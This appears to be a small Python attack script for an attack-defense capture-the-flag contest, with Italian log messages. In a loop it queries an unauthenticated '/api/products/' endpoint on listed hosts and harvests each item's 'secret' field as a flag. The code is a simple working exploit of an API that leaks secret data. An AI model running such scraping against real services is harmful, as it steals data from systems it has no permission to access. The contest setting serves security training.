import requests,time,json;
from datetime import datetime;

ips = ["localhost"]
round_time = 30


def attack(ip):
	newFlags = []
	request = requests.get(f"http://{ip}:8080/api/products/")
	response = request.json()
	for id in response:
		newFlags.append(id["secret"])
	return newFlags


def main():
	round = 0
	while True :
		flags = []
		print(f"Inizio round {round} - {datetime.now().strftime('%H:%M:%S')}\n")
		for ip in ips:
			newFlags = []
			try:
				newFlags = attack(ip)
			except Exception as e:
				print(f"-	Eccezione catturata: l'indirizzo {ip} si Ã¨ difeso\n")
				continue
						
			print(f"-	Catturate {len(newFlags)} nuove flag dall'ip: {ip} - {newFlags}\n")
			flags.extend(newFlags)
		
		print(f"Fine round {round} - Catturate {len(flags)} flag - {datetime.now().strftime('%H:%M:%S')}\n")
		#submit(flags)
		round+=1
		time.sleep(round_time)

main()
